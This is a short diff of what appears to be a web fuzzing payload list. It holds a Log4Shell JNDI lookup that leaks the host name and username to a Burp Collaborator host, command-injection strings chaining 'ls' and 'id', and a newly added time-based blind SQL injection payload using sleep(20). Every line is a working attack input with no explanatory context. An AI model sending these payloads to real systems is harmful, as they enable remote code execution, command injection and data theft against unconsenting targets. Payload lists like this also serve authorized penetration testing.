@@ -1,3 +1,4 @@
 ${jndi:ldap://${:-378}${:-942}.${hostName}.username.burp-collab/Pw8sh}
 %26ls||id%26
 &ls||id&
+-10'XOR(if(now()=sysdate(),sleep(20),0))XOR'Z
